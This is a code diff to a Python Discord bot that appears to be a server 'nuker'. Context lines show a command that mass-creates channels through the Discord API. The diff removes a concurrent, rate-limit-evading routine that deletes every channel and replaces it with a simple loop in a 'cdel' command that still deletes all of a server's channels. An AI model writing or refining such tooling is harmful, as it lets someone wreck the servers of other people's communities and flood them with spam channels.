@@ -168,29 +168,13 @@ async def ccr(ctx):
             r = await session.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers = header, json = {"name": channel_names})
 
 
-async def delchan(session: aiohttp.ClientSession, id):
-	while True:
-		async with session.delete(f"{BASE_URL}/channels/{id}", headers=header) as resp:
-			if resp.status == 200:
-
-				break
-			elif resp.status == 429:
-				j = await resp.json()
-				await asyncio.sleep(j['retry_after'])
-			else:
-				j = await resp.json()
-				break
-
-
-async def channel_deleter(ctx):
-	async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, keepalive_timeout=10000, ttl_dns_cache=10000, limit=0, limit_per_host=0), trust_env=False, skip_auto_headers=None, json_serialize=ujson.dumps, auto_decompress=True) as session:
-		await asyncio.gather(*(asyncio.create_task(delchan(session, channel.id)) for channel in ctx.guild.channels))
 
 
 @bot.command()
 async def cdel(ctx):
 	await ctx.message.delete()
-	await channel_deleter(ctx)
+	for channel in ctx.guild.channels:
+		await channel.delete()
 
 
 
